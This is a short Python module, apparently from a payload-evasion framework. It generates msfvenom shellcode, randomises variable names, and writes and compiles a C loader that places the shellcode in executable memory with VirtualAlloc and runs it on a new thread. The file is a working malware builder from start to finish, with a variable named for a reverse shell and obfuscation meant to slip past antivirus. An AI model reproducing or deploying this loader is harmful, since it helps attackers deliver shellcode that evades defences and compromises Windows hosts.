# Discovered code and adapted from:
# http://www.debasish.in/2012/08/experiment-with-run-time.html

# Import modules
import os
import string
from modules.auxiliary import shellcode
from modules.common import randomizer
from modules.common import messages
from modules.common import csupport

# C Based void pointer
def cVirtualAlloc ():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    RandShellcode = randomizer.randomString()
    RandReverseShell = randomizer.randomString()
    RandMemoryShell = randomizer.randomString()

    # Start creating our C payload
    PayloadFile = open('payload.c', 'w')
    PayloadFile.write('#include <windows.h>\n')
    PayloadFile.write('#include <stdio.h>\n')
    PayloadFile.write('#include <string.h>\n')
    PayloadFile.write('int main()\n')
    PayloadFile.write('{\n')
    PayloadFile.write('    LPVOID lpvAddr;\n')
    PayloadFile.write('    HANDLE hHand;\n')
    PayloadFile.write('    DWORD dwWaitResult;\n')
    PayloadFile.write('    DWORD threadID;\n\n')
    PayloadFile.write('unsigned char buff[] = \n')
    PayloadFile.write('\"' + Shellcode + '\";\n\n')
    PayloadFile.write('lpvAddr = VirtualAlloc(NULL, strlen(buff),0x3000,0x40);\n')
    PayloadFile.write('RtlMoveMemory(lpvAddr,buff, strlen(buff));\n')
    PayloadFile.write('hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n')
    PayloadFile.write('dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n')
    PayloadFile.write('return 0;\n')
    PayloadFile.write('}')
    PayloadFile.close()

    # Compile our C code
    csupport.compilemingw()
